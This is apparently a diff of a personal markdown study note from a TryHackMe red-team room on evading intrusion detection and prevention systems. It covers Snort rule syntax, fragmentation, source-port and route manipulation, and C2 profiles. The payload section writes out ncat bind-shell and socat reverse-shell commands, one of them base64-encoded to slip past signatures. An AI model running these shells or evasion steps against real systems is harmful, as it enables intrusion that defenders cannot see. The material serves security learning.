@@ -1,37 +1,46 @@
 # Evading-IPS-And-IDS
 Visit the [[Intrusion-Detection-Systems]] and [[Intrusion-Prevention-Systems]] articles for more
+
 ## Definitions
 
-IPS = Intrusion Prevention System
-IDS = Intrusion Detection System
-HIDS = Network-based-IDS
-NIDS = Host-based-IDS
+Acronym | Full Name
+--- | --- 
+IPS | Intrusion Prevention System
+IDS  |Intrusion Detection System
+HIDS |  Network-based-IDS
+NIDS |  Host-based-IDS
 
-Network Traffic and Host activity: is either Benign | Malicious traffic.
+Network Traffic and Host activities is either Benign or Malicious traffic.
 
-Signature-based: Signatures of known maliciou traffic fed into IDS.
-Anomaly/Behaviour-based: Regular traffic model, for IDS to detect anomalies.
-Policy-based: Detect based on policy violations
+Method of Detection | Description
+--- | ---
+Signature-based | Signatures of known malicious traffic fed into IDS.
+Anomaly/Behaviour-based |  Regular traffic model, for IDS to detect anomalies.
+Policy-based |  Detect based on policy violations
 
 ## IDS/IPS each have rule syntax:
-Snort uses:
-Rule Header (Rule options)
-Action			alert, log, pass, drop and reject
-Protocol		TCP, UDP, ICMP or IP
-Source IP/Port		!IP/mask any # = anything but from IP/mask range
-Direction of Flow	sourceTOdestination = '->'; '<>' birectional 
-Destination IP/Port	Similar to Source IP/Port
-Some more specifics:
-flow:established 
+For example [[Snort]] uses:
 
+Rule Header | Rule options 
+--- | ---
+Action		|	alert, log, pass, drop and reject
+Protocol	| 	TCP, UDP, ICMP or IP
+Source IP/Port  | IP/mask any # = anything but from IP/mask range
+Direction of Flow |	sourceTOdestination = '->'; '<>' birectional 
+Destination IP/Port |Similar to Source IP/Port
+Some more specifics | `flow:established` (full three handsake stream), `content:"<TYPE>"` 
 
-## General approaches you might consider to evade IDS/IPS systems:
-Evasion via Protocol Manipulation
-Evasion via Payload Manipulation
-Evasion via Route Manipulation
-Evasion via Tactical Denial of Service (DoS)
+Snort rule that detects the term `ncat` in the payload of the traffic exchanged with our webserver to learn how people exploit this vulnerability would end up like:
+``alert tcp any any <> any 80 (msg: "Netcat Exploitation"; flow:established,to_server; content:"POST"; nocase; http_method; content:"ncat"; nocase; sid:1000032; rev:1;)
+
 
 ## Evasion via protocol manipulation includes:
+
+- Use different protocol
+- Source Port
+- Session Splicing
+- Invalid Packets
+
 #### Relying on a different protocol
 
 IF TCP|UDP THEN use UDP|TCP
@@ -45,18 +54,28 @@ IF IPS blocks DNS-queries && HTTP requests THEN:
 	(local machines (cannot query external DNS servers)(can query local DNS server)&& enforces HTTP communications)	
 	HTTPS can tunnel traffic to evade IPS 
 
-Manipulating (Source) TCP/UDP port
-Using session splicing (IP packet fragmentation)
-Sending invalid packets
-Refer to [[Nmap-Cheatsheet]] for evasion strats
+#### Manipulating (Source) TCP/UDP port
 
-## Suppose you want to force all your packets to be fragmented into specific sizes:
-https://www.monkey.org/~dugsong/fragroute/
+If you all your traffic coming from an established [[Network-Services]] port then the recieving end will interpret just by port number, allowing for evasion. Without deep packet inspection, the port numbers are the primary indicator of the service used, unless the security solution can analyze the data carried by the TCP segments.
 
-## Custom packets with Custom fields:
+
+#### Session Splicing
+
+IPv4, IP packet fragmentation or session splicing - simiply breaking and or reordering packets of data up. The assumption regarding this strategies potental evasiveneess is that if traffic is in smaller packets, you will avoid matching to any of the IDS signatures. Dividing your payload among multiple packets and potential reordering them and the reordering it back to its orginal linear order will evade IDS parsing for particular stream of bytes. Unless the IDS reassembles the packets, the rule won’t be triggered.
+
+#### Sending Invalid Packets
+
+Sending invalid packets the response of systems is unclear, therefore experimenting to with invalid pakects an IDS/IPS might process it, while the target system might ignore it.
+
+Refer to [[Nmap-Cheatsheet]] for experimenting with invalid packets to prove the existence of IDS/IPS.
+
+Suppose you want to force all your packets to be fragmented into specific sizes: see [monkey](https://www.monkey.org/~dugsong/fragroute/)
+
+#### Custom packets with Custom fields:
 `hping3 --help`
 
 ## Evasion via Payload Manipulation
+
 ####  Obfuscating and encoding the payload
 ```bash
 ncat -lvnp 1234 -e /bin/bash 	=	bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA== 	#base64
@@ -102,12 +121,12 @@ socat OPENSSL:10.10.10.10:4443,verify=0 EXEC:/bin/bash
 #### Modifying the shellcode
 
 ## Route Manipulation
-With example of [[Nmap-Cheatsheet]]
 
-Relying on source routing with `--ip-options "L $IP $IP $IP"` would specify loose routing - scan through any in the array, whereas strict routing with `"S"` as the 0th index of the string would strict hop from first `$IP` to the last.
+For route manipulation see [[Proxies]] and [[Port-Redirection-And-Tunneling]]
 
-Using proxy servers with `--proxies proto://host:port, proto://host:port`, Valid protocols are HTTP and SOCKS4 - authenication is not supported.
+With examples from the THM Room use: [[Nmap-Cheatsheet]]
 
+Relying on source routing with `--ip-options "L $IP $IP $IP"` would specify loose routing - scan through any in the array, whereas strict routing with `"S"` as the 0th index of the string would strict hop from first `$IP` to the last. Using proxy servers with `--proxies proto://host:port, proto://host:port`, valid protocols are HTTP and SOCKS4 - authenication is not supported.
 
 
 ## Evasion via Tactical DoS
@@ -128,7 +147,6 @@ See [[Introduction-To-Comand-And-Control-Frameworks]] for more information:
 [Cobalt Strike guideline profile](https://github.com/bigb0sss/RedTeam-OffensiveSecurity/blob/master/01-CobaltStrike/malleable_C2_profile/CS4.0_guideline.profile)
 
 
-
 ## Next-Gen Security
 
 Next-Generation Network IPS (NGNIPS) has the following five characteristics according to [Gartner](https://www.gartner.com/en/documents/2390317-next-generation-ips-technology-disrupts-the-ips-market):
@@ -143,3 +161,5 @@ Next-Generation Network IPS (NGNIPS) has the following five characteristics acco
 ## References
 [THM Network Evasion Room](https://tryhackme.com/room/redteamnetsec)
 [Cobalt Strike guideline profile](https://github.com/bigb0sss/RedTeam-OffensiveSecurity/blob/master/01-CobaltStrike/malleable_C2_profile/CS4.0_guideline.profile)
+[monkey](https://www.monkey.org/~dugsong/fragroute/)
+[Gartner](https://www.gartner.com/en/documents/2390317-next-generation-ips-technology-disrupts-the-ips-market):
